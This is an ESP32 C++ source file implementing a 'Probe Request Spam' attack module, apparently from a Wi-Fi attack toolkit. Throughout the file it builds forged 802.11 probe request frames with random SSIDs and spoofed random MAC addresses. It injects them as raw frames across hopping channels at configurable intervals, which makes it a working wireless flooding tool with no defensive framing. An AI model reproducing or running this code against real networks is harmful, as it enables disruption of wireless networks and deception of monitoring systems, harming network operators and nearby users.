/*
 * ProbeSpamAttack.cpp
 * 
 * Implementation of the WiFi Probe Request Spamming Attack module
 */

#include "ProbeSpamAttack.h"
#include <WiFi.h>
#include <esp_random.h>

ProbeSpamAttack::ProbeSpamAttack() : Attack(ATTACK_TYPE_PROBE_SPAM, "Probe Request Spam") {
  // Initialize parameters with defaults
  randomSSIDs = true;
  ssidCount = 20;
  ssidPrefix = "WiFi-";
  useRandomMAC = true;
  startChannel = 1;
  endChannel = 11;
  probeInterval = 50; // ms
  
  // Initialize state variables
  currentChannel = startChannel;
  currentSSIDIndex = 0;
}

ProbeSpamAttack::~ProbeSpamAttack() {
  // Clean up
  stop();
}

bool ProbeSpamAttack::start(unsigned long duration) {
  // Don't start if already running
  if (status == ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Reset error message
  errorMessage = "";
  
  // Generate SSIDs if using random ones
  if (randomSSIDs) {
    generateRandomSSIDs();
  }
  
  // Check if we have any SSIDs
  if (ssidList.size() == 0) {
    errorMessage = "No SSIDs to probe";
    status = ATTACK_STATUS_ERROR;
    return false;
  }
  
  // Initialize WiFi in station mode
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  
  // Set initial channel
  currentChannel = startChannel;
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  
  // Enable promiscuous mode
  esp_wifi_set_promiscuous(true);
  
  Serial.println("Probe Request Spam Attack started");
  Serial.print("Probing for ");
  Serial.print(ssidList.size());
  Serial.print(" SSIDs on channels ");
  Serial.print(startChannel);
  Serial.print(" to ");
  Serial.println(endChannel);
  
  // Set start time and duration
  startTime = millis();
  this->duration = duration;
  lastActionTime = 0;
  
  // Update status
  status = ATTACK_STATUS_RUNNING;
  
  return true;
}

bool ProbeSpamAttack::stop() {
  // Only stop if running
  if (status != ATTACK_STATUS_RUNNING) {
    return true;
  }
  
  // Disable promiscuous mode
  esp_wifi_set_promiscuous(false);
  
  // Restore WiFi
  WiFi.disconnect();
  
  Serial.println("Probe Request Spam Attack stopped");
  
  // Update status
  status = ATTACK_STATUS_STOPPING;
  
  return true;
}

void ProbeSpamAttack::update() {
  // Call base class update
  Attack::update();
  
  // Only perform actions if running
  if (status == ATTACK_STATUS_RUNNING) {
    unsigned long currentMillis = millis();
    
    // Send probe requests at regular intervals
    if (currentMillis - lastActionTime >= probeInterval) {
      lastActionTime = currentMillis;
      
      // Send probe request for current SSID
      if (currentSSIDIndex < ssidList.size()) {
        sendProbeRequest(ssidList[currentSSIDIndex], currentChannel);
        
        // Move to next SSID
        currentSSIDIndex = (currentSSIDIndex + 1) % ssidList.size();
        
        // Change channel if we've gone through all SSIDs
        if (currentSSIDIndex == 0) {
          currentChannel++;
          if (currentChannel > endChannel) {
            currentChannel = startChannel;
          }
          esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        }
      }
    }
  }
}

bool ProbeSpamAttack::setParameter(const String& name, const String& value) {
  if (name == "random") {
    if (value == "true" || value == "1") {
      randomSSIDs = true;
      return true;
    } else if (value == "false" || value == "0") {
      randomSSIDs = false;
      return true;
    } else {
      errorMessage = "Invalid value (use true/false or 1/0)";
      return false;
    }
  }
  else if (name == "count") {
    int count = value.toInt();
    if (count > 0 && count <= MAX_PROBE_SSIDS) {
      ssidCount = count;
      return true;
    } else {
      errorMessage = "Invalid count (must be 1-" + String(MAX_PROBE_SSIDS) + ")";
      return false;
    }
  }
  else if (name == "prefix") {
    ssidPrefix = value;
    return true;
  }
  else if (name == "add") {
    // Add a custom SSID to the list
    if (value.length() > 0 && value.length() <= PROBE_SSID_MAX_LENGTH) {
      if (ssidList.size() < MAX_PROBE_SSIDS) {
        ssidList.push_back(value);
        randomSSIDs = false; // Switch to custom SSID list
        return true;
      } else {
        errorMessage = "Maximum number of SSIDs reached";
        return false;
      }
    } else {
      errorMessage = "Invalid SSID length";
      return false;
    }
  }
  else if (name == "clear") {
    ssidList.clear();
    return true;
  }
  else if (name == "randommac") {
    if (value == "true" || value == "1") {
      useRandomMAC = true;
      return true;
    } else if (value == "false" || value == "0") {
      useRandomMAC = false;
      return true;
    } else {
      errorMessage = "Invalid value (use true/false or 1/0)";
      return false;
    }
  }
  else if (name == "startchannel") {
    int channel = value.toInt();
    if (channel >= 1 && channel <= 14) {
      startChannel = channel;
      if (startChannel > endChannel) {
        endChannel = startChannel;
      }
      return true;
    } else {
      errorMessage = "Invalid channel (must be 1-14)";
      return false;
    }
  }
  else if (name == "endchannel") {
    int channel = value.toInt();
    if (channel >= 1 && channel <= 14) {
      endChannel = channel;
      if (endChannel < startChannel) {
        startChannel = endChannel;
      }
      return true;
    } else {
      errorMessage = "Invalid channel (must be 1-14)";
      return false;
    }
  }
  else if (name == "interval") {
    int interval = value.toInt();
    if (interval >= 10) {
      probeInterval = interval;
      return true;
    } else {
      errorMessage = "Invalid interval (must be >= 10ms)";
      return false;
    }
  }
  
  errorMessage = "Unknown parameter: " + name;
  return false;
}

String ProbeSpamAttack::getParameter(const String& name) const {
  if (name == "random") {
    return randomSSIDs ? "true" : "false";
  }
  else if (name == "count") {
    return String(ssidCount);
  }
  else if (name == "prefix") {
    return ssidPrefix;
  }
  else if (name == "ssids") {
    String result = "";
    for (const String& ssid : ssidList) {
      if (result.length() > 0) {
        result += ", ";
      }
      result += ssid;
    }
    return result;
  }
  else if (name == "randommac") {
    return useRandomMAC ? "true" : "false";
  }
  else if (name == "startchannel") {
    return String(startChannel);
  }
  else if (name == "endchannel") {
    return String(endChannel);
  }
  else if (name == "interval") {
    return String(probeInterval);
  }
  
  return "";
}

String ProbeSpamAttack::getAllParameters() const {
  String params = "{";
  params += "\"random\":" + String(randomSSIDs ? "true" : "false") + ",";
  params += "\"count\":" + String(ssidCount) + ",";
  params += "\"prefix\":\"" + ssidPrefix + "\",";
  params += "\"ssid_count\":" + String(ssidList.size()) + ",";
  params += "\"randommac\":" + String(useRandomMAC ? "true" : "false") + ",";
  params += "\"startchannel\":" + String(startChannel) + ",";
  params += "\"endchannel\":" + String(endChannel) + ",";
  params += "\"interval\":" + String(probeInterval);
  params += "}";
  
  return params;
}

void ProbeSpamAttack::generateRandomSSIDs() {
  // Clear existing SSIDs
  ssidList.clear();
  
  // Generate random SSIDs
  for (int i = 0; i < ssidCount; i++) {
    String ssid = ssidPrefix;
    
    // Add random characters
    int randomLength = random(3, 8);
    for (int j = 0; j < randomLength; j++) {
      char c;
      if (random(3) == 0) {
        // Digit
        c = '0' + random(10);
      } else {
        // Letter
        c = 'A' + random(26);
      }
      ssid += c;
    }
    
    ssidList.push_back(ssid);
  }
}

void ProbeSpamAttack::sendProbeRequest(const String& ssid, uint8_t channel) {
  // Create a copy of the probe request packet template
  uint8_t packet[PROBE_PACKET_SIZE];
  memcpy(packet, probePacket, PROBE_PACKET_SIZE);
  
  // Set MAC address (source)
  uint8_t mac[6];
  if (useRandomMAC) {
    generateRandomMAC(mac);
  } else {
    // Use ESP32's MAC address
    esp_read_mac(mac, ESP_MAC_WIFI_STA);
  }
  
  memcpy(&packet[10], mac, 6); // Source MAC
  
  // Set SSID
  int ssidLength = ssid.length();
  if (ssidLength > PROBE_SSID_MAX_LENGTH) {
    ssidLength = PROBE_SSID_MAX_LENGTH;
  }
  
  packet[25] = ssidLength; // SSID length
  memcpy(&packet[26], ssid.c_str(), ssidLength);
  
  // Calculate packet length
  int packetLength = 26 + ssidLength + 42; // Header + SSID + other parameters
  
  // Send the packet
  esp_wifi_80211_tx(WIFI_IF_STA, packet, packetLength, false);
  
  // Debug output
  if (currentSSIDIndex == 0) { // Only print for the first SSID to avoid flooding the console
    Serial.print("Sent probe request for SSID '");
    Serial.print(ssid);
    Serial.print("' on channel ");
    Serial.print(channel);
    Serial.print(" with MAC ");
    printMACAddress(mac);
  }
}

void ProbeSpamAttack::generateRandomMAC(uint8_t* mac) {
  // Generate random MAC address
  for (int i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  
  // Ensure it's a unicast address (clear bit 0 of the first byte)
  mac[0] &= 0xFE;
  
  // Ensure it's a locally administered address (set bit 1 of the first byte)
  mac[0] |= 0x02;
}

void ProbeSpamAttack::printMACAddress(const uint8_t* mac) {
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  Serial.println(macStr);
}
